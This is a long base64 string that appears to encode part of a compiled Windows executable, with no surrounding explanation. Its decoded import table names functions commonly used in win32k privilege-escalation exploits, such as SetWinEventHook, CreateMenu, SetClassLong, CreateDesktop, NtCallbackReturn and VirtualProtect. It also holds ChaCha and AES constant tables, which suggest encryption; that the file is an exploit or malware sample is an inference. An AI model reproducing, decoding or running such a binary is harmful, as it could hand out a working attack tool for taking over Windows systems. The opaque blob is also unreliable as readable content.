AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAhCsAAHQsAABiLAAAUiwAAEQsAADqKgAA/ioAAA4rAAAgKwAALisAADorAABQKwAAZisAAG4rAAB6KwAAJiwAAJIrAACiKwAAuisAAMgrAADaKwAA7isAAAIsAAASLAAAOCwAAAAAAAAGLwAA9C4AAAAAAABULgAAQi4AAIwsAACeLAAAsCwAAL4sAADQLAAA3iwAAO4sAAD6LAAACi0AAB4tAAAwLQAAQi0AAFQtAABiLQAAdC0AAIQtAACULQAAoi0AALYtAADGLQAA1i0AAOgtAAD4LQAACC4AABwuAAAqLgAAAAAAANIqAAC6KgAAxCoAALAqAAAAAAAAlC4AAMwuAADaLgAAtC4AAIAuAABwLgAApi4AAAAAAAB8KgAAAAAAAAAAAADeKgAA6CgAAJQpAAAAAAAAAAAAAH4sAAAAKAAACCoAAAAAAAAAAAAAZC4AAHQoAACQKgAAAAAAAAAAAADqLgAA/CgAAPwpAAAAAAAAAAAAABYvAABoKAAAAAAAAAAAAAAAAAAAAAAAAAAAAACEKwAAdCwAAGIsAABSLAAARCwAAOoqAAD+KgAADisAACArAAAuKwAAOisAAFArAABmKwAAbisAAHorAAAmLAAAkisAAKIrAAC6KwAAyCsAANorAADuKwAAAiwAABIsAAA4LAAAAAAAAAYvAAD0LgAAAAAAAFQuAABCLgAAjCwAAJ4sAACwLAAAviwAANAsAADeLAAA7iwAAPosAAAKLQAAHi0AADAtAABCLQAAVC0AAGItAAB0LQAAhC0AAJQtAACiLQAAti0AAMYtAADWLQAA6C0AAPgtAAAILgAAHC4AACouAAAAAAAA0ioAALoqAADEKgAAsCoAAAAAAACULgAAzC4AANouAAC0LgAAgC4AAHAuAACmLgAAAAAAABYFc3RyY3B5AADuBG1lbXNldAAAOQNfc253cHJpbnRmAABeA19zdHJpY21wAABtc3ZjcnQuZGxsAAA7AUdldEN1cnJlbnRQcm9jZXNzALsBR2V0U3lzdGVtSW5mbwA1AklzV293NjRQcm9jZXNzAABSA1Rsc1NldFZhbHVlAAsCSGVhcEZyZWUAAH4DV2FpdEZvclNpbmdsZU9iamVjdAA+AUdldEN1cnJlbnRUaHJlYWRJZAAAQgNTbGVlcAAFAkhlYXBBbGxvYwBDA1NsZWVwRXgAUQNUbHNHZXRWYWx1ZQBLAENyZWF0ZUV2ZW50QQAALANTZXRUaHJlYWRBZmZpbml0eU1hc2sABwJIZWFwQ3JlYXRlAAB0A1ZpcnR1YWxQcm90ZWN0AAAfA1NldFByaW9yaXR5Q2xhc3MAADEDU2V0VGhyZWFkUHJpb3JpdHkAwgJSZXN1bWVUaHJlYWQAAHYBR2V0TW9kdWxlSGFuZGxlQQAASwNUZXJtaW5hdGVUaHJlYWQATwNUbHNBbGxvYwAAMQBDbG9zZUhhbmRsZQBsAENyZWF0ZVRocmVhZAAAnAFHZXRQcm9jZXNzSGVhcAAAUANUbHNGcmVlAEtFUk5FTDMyLmRsbAAArAJVbmhvb2tXaW5FdmVudAAAfgJTZXRXaW5FdmVudEhvb2sAXQBDcmVhdGVNZW51AAABAlBvc3RRdWl0TWVzc2FnZQAIAEFwcGVuZE1lbnVBAEcCU2V0Q2xhc3NMb25nQQBmAlNldFBhcmVudAA7AlNlbmRNZXNzYWdlQQAAqgJUcmFuc2xhdGVNZXNzYWdlAABgAENyZWF0ZVdpbmRvd0V4QQCOAERlZldpbmRvd1Byb2NBAAAWAlJlZ2lzdGVyQ2xhc3NBAABgAlNldE1lbnVJbmZvAIACU2V0V2luZG93TG9uZ0EAAPoAR2V0Q2xhc3NMb25nQQBIAlNldENsYXNzTG9uZ1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